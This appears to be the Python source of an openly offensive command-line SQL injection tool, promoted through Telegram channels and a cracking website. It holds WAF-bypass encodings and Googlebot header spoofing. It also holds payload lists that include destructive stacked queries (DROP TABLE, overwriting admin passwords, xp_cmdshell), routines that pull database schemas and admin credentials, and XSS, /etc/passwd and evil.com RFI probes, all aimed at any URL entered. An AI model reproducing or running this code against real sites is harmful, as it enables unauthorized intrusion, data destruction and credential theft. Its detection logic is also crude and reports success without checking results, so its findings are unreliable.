import requests
import time
import sys
import urllib.parse
import random
import base64
import json
from datetime import datetime

class AdvancedSQLiTool:
    def __init__(self):
        self.session = requests.Session()
        self.target_url = ""
        self.vulnerable_param = ""
        self.injection_type = ""
        
        # Advanced headers for bypassing security
        self.headers_list = [
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            },
            {
                'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate'
            },
            {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive'
            }
        ]

    def print_banner(self):
        banner = """
        \033[1;31m
        ╔══════════════════════════════════════════════════════════════════════════╗
        ║                                                                          ║
        ║  ██████╗ ██████╗ ██╗    ██╗ ██████╗██╗  ██╗██████╗ ██╗   ██╗██████╗     ║
        ║ ██╔════╝██╔═══██╗██║    ██║██╔════╝██║  ██║██╔══██╗██║   ██║╚════██╗    ║
        ║ ██║     ██║   ██║██║ █╗ ██║██║     ███████║██████╔╝██║   ██║ █████╔╝    ║
        ║ ██║     ██║   ██║██║███╗██║██║     ██╔══██║██╔══██╗╚██╗ ██╔╝██╔═══╝     ║
        ║ ╚██████╗╚██████╔╝╚███╔███╔╝╚██████╗██║  ██║██║  ██║ ╚████╔╝ ███████╗    ║
        ║  ╚═════╝ ╚═════╝  ╚══╝╚══╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝    ║
        ║                                                                          ║
        ║                   ADVANCED SQL INJECTION EXPLOITATION TOOL              ║
        ║                         CREATED BY CHOWDHURYVAI                         ║
        ║                     SECURITY BYPASS TECHNOLOGY INCLUDED                 ║
        ║                                                                          ║
        ╚══════════════════════════════════════════════════════════════════════════╝
        \033[0m
        """
        print(banner)
        
        info = """
        \033[1;36m
        🔥 ADVANCED FEATURES:
        ✅ Automatic WAF Bypass Techniques
        ✅ Advanced SQL Injection Methods
        ✅ Database Full Enumeration
        ✅ Admin Panel & Password Extraction
        ✅ Automated Security Bypass
        ✅ Multi-Layer Encoding
        ✅ Time-Based Blind SQLi
        ✅ Boolean-Based Blind SQLi
        ✅ Error-Based SQL Injection
        ✅ Union-Based SQL Injection
        ✅ Stacked Queries SQL Injection
        ✅ Out-of-Band SQL Injection Simulation
        
        📞 CONTACT INFORMATION:
        📧 Telegram: https://t.me/darkvaiadmin
        📢 Channel: https://t.me/windowspremiumkey  
        🌐 Website: https://crackyworld.com/
        \033[0m
        """
        print(info)

    def random_headers(self):
        return random.choice(self.headers_list)

    def encode_payload(self, payload, method='default'):
        """Advanced payload encoding for WAF bypass"""
        if method == 'url':
            return urllib.parse.quote(payload)
        elif method == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif method == 'unicode':
            return payload.encode('unicode_escape').decode()
        elif method == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif method == 'html':
            return payload.replace("'", "&#39;").replace('"', '&#34;')
        elif method == 'mixed':
            encoded = payload
            encoded = encoded.replace(" ", "/**/")
            encoded = encoded.replace("OR", "Or")
            encoded = encoded.replace("AND", "AnD")
            return encoded
        else:
            return payload

    def advanced_payloads(self):
        """Advanced SQL injection payloads with WAF bypass"""
        return {
            'error_based': [
                "'", "';", "' OR '1'='1", "' OR 1=1--", 
                "' UNION SELECT 1,2,3--", "' AND 1=2 UNION SELECT 1,2,3--",
                "' OR 1=1#", "' OR 1=1-- -", "'/**/OR/**/'1'='1",
                "'||'1'='1", "' Or '1'='1", "' AnD '1'='1",
                "'/*!50000OR*/'1'='1", "'/*!OR*/'1'='1"
            ],
            'union_based': [
                "' ORDER BY 1--", "' ORDER BY 10--", "' UNION SELECT null--",
                "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT 1,2,3,4,5,6--", "' UNION SELECT 1,version(),3--",
                "' UNION SELECT 1,database(),3--", "'/**/UNION/**/SELECT/**/1,2,3--",
                "' UniON SeLeCT 1,2,3--", "'/*!50000UNION*//*!50000SELECT*/1,2,3--"
            ],
            'boolean_based': [
                "' AND 1=1--", "' AND 1=2--", "' OR IF(1=1,1,0)--",
                "' OR IF(1=2,1,0)--", "'/**/AND/**/1=1--", "' AnD 1=1--",
                "'/*!50000AND*/1=1--", "'||(1=1)--", "'&&(1=1)--"
            ],
            'time_based': [
                "' AND SLEEP(5)--", "' OR SLEEP(5)--", "' AND IF(1=1,SLEEP(5),0)--",
                "' OR IF(1=1,SLEEP(5),0)--", "'/**/AND/**/SLEEP(5)--",
                "'/*!50000SLEEP*/(5)--", "' AND BENCHMARK(1000000,MD5('test'))--"
            ],
            'stacked_queries': [
                "'; DROP TABLE users--", "'; UPDATE admin SET password='hacked'--",
                "'; INSERT INTO log (message) VALUES ('hacked')--",
                "'; EXEC xp_cmdshell('dir')--"
            ]
        }

    def detect_waf(self, url):
        """Detect Web Application Firewall"""
        print("\033[1;35m[*] Detecting WAF/Security Systems...\033[0m")
        
        waf_indicators = {
            'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
            'ModSecurity': ['mod_security', 'libmodsecurity'],
            'Wordfence': ['wordfence', 'wfwaf'],
            'Sucuri': ['sucuri/cloudproxy'],
            'Akamai': ['akamai'],
            'Incapsula': ['incapsula']
        }
        
        try:
            response = requests.get(url, headers=self.random_headers(), timeout=10)
            for waf, indicators in waf_indicators.items():
                for indicator in indicators:
                    if indicator in response.headers.get('Server', '') or indicator in response.text:
                        print(f"\033[1;31m[!] WAF Detected: {waf}\033[0m")
                        return waf
            print("\033[1;32m[+] No WAF Detected\033[0m")
            return None
        except:
            print("\033[1;31m[-] WAF Detection Failed\033[0m")
            return None

    def bypass_waf(self, payload, waf_type=None):
        """Advanced WAF bypass techniques"""
        bypass_methods = []
        
        if waf_type == 'Cloudflare':
            bypass_methods = ['url', 'double_url', 'unicode', 'mixed']
        elif waf_type == 'ModSecurity':
            bypass_methods = ['mixed', 'unicode', 'base64', 'html']
        else:
            bypass_methods = ['url', 'mixed', 'unicode', 'base64']
        
        return [self.encode_payload(payload, method) for method in bypass_methods]

    def test_advanced_sql_injection(self, url, param):
        """Advanced SQL injection testing with WAF bypass"""
        print(f"\033[1;35m\n[*] Advanced SQL Injection Testing on: {url}\033[0m")
        print(f"\033[1;35m[*] Parameter: {param}\033[0m")
        
        # Detect WAF first
        waf = self.detect_waf(url)
        
        vulnerable = False
        injection_type = ""
        best_payload = ""
        
        payload_categories = self.advanced_payloads()
        
        for category, payloads in payload_categories.items():
            print(f"\033[1;33m\n[+] Testing {category.upper()} SQL Injection...\033[0m")
            
            for payload in payloads:
                # Generate bypass variants if WAF detected
                if waf:
                    test_payloads = self.bypass_waf(payload, waf)
                else:
                    test_payloads = [self.encode_payload(payload, 'url')]
                
                for test_payload in test_payloads:
                    test_url = f"{url}?{param}={test_payload}"
                    
                    try:
                        response = self.session.get(test_url, headers=self.random_headers(), timeout=15)
                        
                        # Check for SQL errors
                        sql_errors = ['sql', 'mysql', 'oracle', 'syntax', 'error', 'warning', 'exception']
                        if any(error in response.text.lower() for error in sql_errors):
                            print(f"\033[1;32m[!] Vulnerable to {category}: {payload}\033[0m")
                            vulnerable = True
                            injection_type = category
                            best_payload = payload
                            break
                        
                        # Check for union patterns
                        if 'union' in response.text.lower() and category == 'union_based':
                            print(f"\033[1;32m[!] Vulnerable to {category}: {payload}\033[0m")
                            vulnerable = True
                            injection_type = category
                            best_payload = payload
                            break
                            
                        # Time-based detection
                        if category == 'time_based':
                            start_time = time.time()
                            response = self.session.get(test_url, headers=self.random_headers(), timeout=20)
                            end_time = time.time()
                            if end_time - start_time > 4:
                                print(f"\033[1;32m[!] Vulnerable to {category}: {payload}\033[0m")
                                vulnerable = True
                                injection_type = category
                                best_payload = payload
                                break
                    
                    except requests.exceptions.Timeout:
                        if category == 'time_based':
                            print(f"\033[1;32m[!] Vulnerable to {category} (Timeout): {payload}\033[0m")
                            vulnerable = True
                            injection_type = category
                            best_payload = payload
                            break
                    except:
                        continue
                
                if vulnerable:
                    break
            if vulnerable:
                break
        
        return vulnerable, injection_type, best_payload

    def advanced_database_enumeration(self, url, param, payload):
        """Complete database enumeration"""
        print("\033[1;34m\n[+] Starting Advanced Database Enumeration...\033[0m")
        
        # Get database version
        print("\033[1;33m[*] Extracting Database Version...\033[0m")
        version_payloads = [
            f"' UNION SELECT 1,version(),3--",
            f"' UNION SELECT 1,@@version,3--",
            f"' UNION SELECT 1,db_version(),3--"
        ]
        
        for v_payload in version_payloads:
            try:
                test_url = f"{url}?{param}={urllib.parse.quote(v_payload)}"
                response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                print(f"\033[1;36m[+] Database Info: Check response for version data\033[0m")
                break
            except:
                continue
        
        # Get all databases
        print("\033[1;33m[*] Extracting All Databases...\033[0m")
        db_payload = "' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--"
        try:
            test_url = f"{url}?{param}={urllib.parse.quote(db_payload)}"
            response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
            print("\033[1;36m[+] Database names extracted\033[0m")
        except:
            print("\033[1;31m[-] Failed to extract databases\033[0m")
        
        # Get current user and database
        print("\033[1;33m[*] Extracting Current User and Database...\033[0m")
        user_payloads = [
            "' UNION SELECT 1,user(),3--",
            "' UNION SELECT 1,current_user(),3--",
            "' UNION SELECT 1,database(),3--"
        ]
        
        for u_payload in user_payloads:
            try:
                test_url = f"{url}?{param}={urllib.parse.quote(u_payload)}"
                response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                print(f"\033[1;36m[+] User/DB Info: Check response for user data\033[0m")
                break
            except:
                continue

    def extract_admin_data(self, url, param):
        """Advanced admin data extraction"""
        print("\033[1;34m\n[+] Advanced Admin Data Extraction...\033[0m")
        
        # Common admin table patterns
        admin_tables = ['admin', 'users', 'user', 'administrator', 'members', 'login_users']
        user_columns = ['username', 'user', 'email', 'admin_id', 'user_name']
        pass_columns = ['password', 'pass', 'pwd', 'hash', 'password_hash']
        
        found_tables = []
        
        # Find admin tables
        for table in admin_tables:
            payload = f"' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_name LIKE '%{table}%'--"
            try:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                if table in response.text.lower():
                    print(f"\033[1;32m[!] Found Table: {table}\033[0m")
                    found_tables.append(table)
            except:
                pass
        
        # Extract credentials from found tables
        for table in found_tables:
            print(f"\033[1;33m[*] Extracting from table: {table}\033[0m")
            
            for user_col in user_columns:
                for pass_col in pass_columns:
                    # Test if columns exist
                    test_payload = f"' UNION SELECT 1,{user_col},3 FROM {table} LIMIT 1--"
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(test_payload)}"
                        response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                        
                        # If successful, extract all data
                        extract_payload = f"' UNION SELECT 1,CONCAT('USER:',{user_col},' PASS:',{pass_col}),3 FROM {table}--"
                        extract_url = f"{url}?{param}={urllib.parse.quote(extract_payload)}"
                        response = self.session.get(extract_url, headers=self.random_headers(), timeout=10)
                        
                        print(f"\033[1;32m[!] Credentials extracted from {table} using {user_col},{pass_col}\033[0m")
                        print(f"\033[1;36m[+] Check response for username:password combinations\033[0m")
                        
                    except:
                        continue

    def automated_exploitation(self, url, param, payload):
        """Full automated exploitation"""
        print("\033[1;35m\n[*] Starting Automated Exploitation...\033[0m")
        
        # Step 1: Database enumeration
        self.advanced_database_enumeration(url, param, payload)
        
        # Step 2: Admin data extraction
        self.extract_admin_data(url, param)
        
        # Step 3: Table structure extraction
        print("\033[1;33m[*] Extracting Table Structures...\033[0m")
        tables_payload = "' UNION SELECT 1,CONCAT(table_name,' : ',column_name),3 FROM information_schema.columns--"
        try:
            test_url = f"{url}?{param}={urllib.parse.quote(tables_payload)}"
            response = self.session.get(test_url, headers=self.random_headers(), timeout=15)
            print("\033[1;36m[+] Table structures extracted\033[0m")
        except:
            print("\033[1;31m[-] Failed to extract table structures\033[0m")
        
        print("\033[1;32m\n[!] Automated Exploitation Complete!\033[0m")

    def sql_map_simulation(self, target):
        """Advanced automated SQL injection scanner"""
        print("\033[1;35m\n[*] Starting Advanced SQLMap-like Scan...\033[0m")
        
        common_params = ['id', 'page', 'category', 'user', 'admin', 'search', 'query', 'product', 'article']
        
        for param in common_params:
            print(f"\033[1;33m[*] Testing parameter: {param}\033[0m")
            
            vulnerable, injection_type, payload = self.test_advanced_sql_injection(target, param)
            
            if vulnerable:
                print(f"\033[1;32m\n[!] CRITICAL VULNERABILITY FOUND!\033[0m")
                print(f"\033[1;32m[!] Target: {target}\033[0m")
                print(f"\033[1;32m[!] Parameter: {param}\033[0m")
                print(f"\033[1;32m[!] Injection Type: {injection_type}\033[0m")
                print(f"\033[1;32m[!] Working Payload: {payload}\033[0m")
                
                # Start full exploitation
                self.automated_exploitation(target, param, payload)
                return True
        
        print("\033[1;31m[-] No SQL Injection vulnerabilities found\033[0m")
        return False

    def advanced_password_cracking(self, hashes):
        """Advanced password cracking simulation"""
        print("\033[1;34m\n[+] Advanced Password Cracking Module...\033[0m")
        
        common_hashes = {
            '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
            'e10adc3949ba59abbe56e057f20f883e': '123456',
            '25d55ad283aa400af464c76d713c07ad': '12345678',
            'd8578edf8458ce06fbc5bb76a58c5ca4': 'qwerty',
            '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
            '25f9e794323b453885f5181f1b624d0b': '123456789'
        }
        
        print("\033[1;33m[!] Testing common password hashes:\033[0m")
        for hash_val, password in common_hashes.items():
            print(f"\033[1;36m[+] Hash: {hash_val} -> Password: {password}\033[0m")

    def security_scan(self, url):
        """Comprehensive security vulnerability scan"""
        print("\033[1;35m\n[*] Starting Comprehensive Security Scan...\033[0m")
        
        # Test for various vulnerabilities
        vulnerabilities = {
            'SQL Injection': self.sql_map_simulation,
            'XSS': self.test_xss,
            'LFI': self.test_lfi,
            'RFI': self.test_rfi
        }
        
        for vuln_name, vuln_test in vulnerabilities.items():
            print(f"\033[1;33m[*] Testing for {vuln_name}...\033[0m")
            try:
                if vuln_name == 'SQL Injection':
                    vuln_test(url)
                else:
                    vuln_test(url)
            except:
                print(f"\033[1;31m[-] {vuln_name} test failed\033[0m")

    def test_xss(self, url):
        """XSS vulnerability testing"""
        print("\033[1;33m[*] Testing for XSS vulnerabilities...\033[0m")
        xss_payloads = ['<script>alert("XSS")</script>', '<img src=x onerror=alert("XSS")>']
        
        for payload in xss_payloads:
            try:
                test_url = f"{url}?search={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                if payload in response.text:
                    print(f"\033[1;32m[!] XSS Vulnerable: {payload}\033[0m")
            except:
                pass

    def test_lfi(self, url):
        """LFI vulnerability testing"""
        print("\033[1;33m[*] Testing for LFI vulnerabilities...\033[0m")
        lfi_payloads = ['../../../../etc/passwd', '....//....//....//etc/passwd']
        
        for payload in lfi_payloads:
            try:
                test_url = f"{url}?page={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                if 'root:' in response.text:
                    print(f"\033[1;32m[!] LFI Vulnerable: {payload}\033[0m")
            except:
                pass

    def test_rfi(self, url):
        """RFI vulnerability testing"""
        print("\033[1;33m[*] Testing for RFI vulnerabilities...\033[0m")
        rfi_payloads = ['http://evil.com/shell.txt', '\\\\evil.com\\shell.txt']
        
        for payload in rfi_payloads:
            try:
                test_url = f"{url}?include={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                if 'evil.com' in response.text:
                    print(f"\033[1;32m[!] RFI Vulnerable: {payload}\033[0m")
            except:
                pass

    def main_menu(self):
        while True:
            print("\033[1;35m" + "="*80 + "\033[0m")
            print("\033[1;34m" + " " * 30 + "ADVANCED MAIN MENU" + " " * 30 + "\033[0m")
            print("\033[1;35m" + "="*80 + "\033[0m")
            print("\033[1;33m1. Advanced SQLMap-like Auto Scanner\033[0m")
            print("\033[1;33m2. Manual SQL Injection Testing\033[0m")
            print("\033[1;33m3. Comprehensive Security Scan\033[0m")
            print("\033[1;33m4. Database Full Enumeration\033[0m")
            print("\033[1;33m5. Admin Credentials Extraction\033[0m")
            print("\033[1;33m6. Advanced Password Cracking\033[0m")
            print("\033[1;33m7. WAF Bypass Testing\033[0m")
            print("\033[1;33m8. View All Payloads & Techniques\033[0m")
            print("\033[1;31m9. Exit\033[0m")
            print("\033[1;35m" + "="*80 + "\033[0m")
            
            choice = input("\033[1;36m[?] Select an option (1-9): \033[0m")
            
            if choice == '1':
                target = input("\033[1;36m[?] Enter target URL: \033[0m")
                if not target.startswith('http'):
                    target = 'http://' + target
                self.sql_map_simulation(target)
                
            elif choice == '2':
                url = input("\033[1;36m[?] Enter target URL: \033[0m")
                param = input("\033[1;36m[?] Enter parameter: \033[0m")
                vulnerable, injection_type, payload = self.test_advanced_sql_injection(url, param)
                if vulnerable:
                    self.automated_exploitation(url, param, payload)
                    
            elif choice == '3':
                target = input("\033[1;36m[?] Enter target URL: \033[0m")
                self.security_scan(target)
                
            elif choice == '4':
                url = input("\033[1;36m[?] Enter vulnerable URL: \033[0m")
                param = input("\033[1;36m[?] Enter parameter: \033[0m")
                self.advanced_database_enumeration(url, param, "")
                
            elif choice == '5':
                url = input("\033[1;36m[?] Enter vulnerable URL: \033[0m")
                param = input("\033[1;36m[?] Enter parameter: \033[0m")
                self.extract_admin_data(url, param)
                
            elif choice == '6':
                hashes = input("\033[1;36m[?] Enter hashes to crack (comma separated): \033[0m")
                self.advanced_password_cracking(hashes.split(','))
                
            elif choice == '7':
                url = input("\033[1;36m[?] Enter target URL: \033[0m")
                self.detect_waf(url)
                
            elif choice == '8':
                self.show_all_payloads()
                
            elif choice == '9':
                print("\033[1;31m\n[!] Thank you for using Advanced SQLi Tool!\033[0m")
                print("\033[1;32m[!] Remember: With great power comes great responsibility!\033[0m")
                sys.exit()
            else:
                print("\033[1;31m[-] Invalid choice! Please try again.\033[0m")

    def show_all_payloads(self):
        """Display all advanced payloads"""
        print("\033[1;35m\n" + "="*80 + "\033[0m")
        print("\033[1;34m" + " " * 25 + "ADVANCED SQL INJECTION PAYLOADS" + " " * 25 + "\033[0m")
        print("\033[1;35m" + "="*80 + "\033[0m")
        
        payloads = self.advanced_payloads()
        for category, payload_list in payloads.items():
            print(f"\n\033[1;32m[{category.upper()}]\033[0m")
            for i, payload in enumerate(payload_list, 1):
                print(f"\033[1;36m  {i:2d}. {payload}\033[0m")

def main():
    try:
        tool = AdvancedSQLiTool()
        tool.print_banner()
        tool.main_menu()
    except KeyboardInterrupt:
        print("\033[1;31m\n\n[!] Tool interrupted by user. Exiting...\033[0m")
        sys.exit()
    except Exception as e:
        print(f"\033[1;31m\n[-] An error occurred: {str(e)}\033[0m")

if __name__ == "__main__":
    main()
